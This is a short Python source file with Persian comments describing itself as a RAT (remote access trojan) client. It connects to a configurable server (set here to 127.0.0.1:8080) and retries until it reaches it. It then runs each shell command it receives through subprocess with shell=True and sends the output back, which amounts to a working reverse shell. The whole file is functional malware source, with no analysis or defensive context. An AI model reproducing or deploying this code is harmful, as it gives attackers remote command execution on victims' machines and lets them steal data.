import socket
import subprocess
import os
import time

# تنظیمات سرور RAT
SERVER_IP = '127.0.0.1'  # آدرس IP سرور
SERVER_PORT = 8080  # پورت برای ارتباط با سرور

# ایجاد اتصال به سرور
def connect_to_server():
    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((SERVER_IP, SERVER_PORT))
            print(f"Connected to server at {SERVER_IP}:{SERVER_PORT}")
            return client_socket
        except Exception as e:
            print(f"Error connecting to server: {e}. Retrying...")
            time.sleep(5)  # تلاش مجدد پس از 5 ثانیه

# دریافت دستور از سرور و اجرا آن
def receive_and_execute(client_socket):
    while True:
        try:
            # دریافت دستور از سرور
            command = client_socket.recv(1024).decode('utf-8')
            if not command:
                break

            # دستور 'exit' برای قطع ارتباط
            elif command.lower() == 'exit':
                print("Exiting...")
                break

            # اجرای دستور shell
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                client_socket.send(output)
            except subprocess.CalledProcessError as e:
                error_message = f"Error executing command: {e.output.decode('utf-8')}"
                client_socket.send(error_message.encode())
        except Exception as e:
            print(f"Error while receiving/executing command: {e}")
            break

# برنامه اصلی
if __name__ == "__main__":
    client_socket = connect_to_server()  # اتصال به سرور
    if client_socket:
        receive_and_execute(client_socket)  # دریافت و اجرای دستورات
        client_socket.close()  # بستن اتصال
